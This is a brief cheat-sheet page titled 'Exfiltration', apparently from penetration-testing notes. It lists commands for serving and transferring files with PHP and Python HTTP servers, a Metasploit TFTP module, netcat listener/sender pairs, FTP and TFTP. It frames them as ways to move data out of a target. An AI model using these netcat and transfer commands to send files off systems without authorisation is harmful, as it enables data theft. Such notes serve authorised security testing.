+++
Title = "Exfiltration"
weight = 6
+++

### Serving files

```
php -S 0.0.0.0:80
python -m SimpleHTTPServer [<port>]
auxilaiary/server/tftp (MSF)
```

### Netcat

```
nc -lvp <port> > <outfile>
nc <ip> <port> < <infile>

nc -lvp <port> < <infile>
nc <ip> <port> > <outfile>
```

### FTP

```
ftp <ip>
get <file>
```

### TFTP

```
tftp -i <ip> GET <file>
```
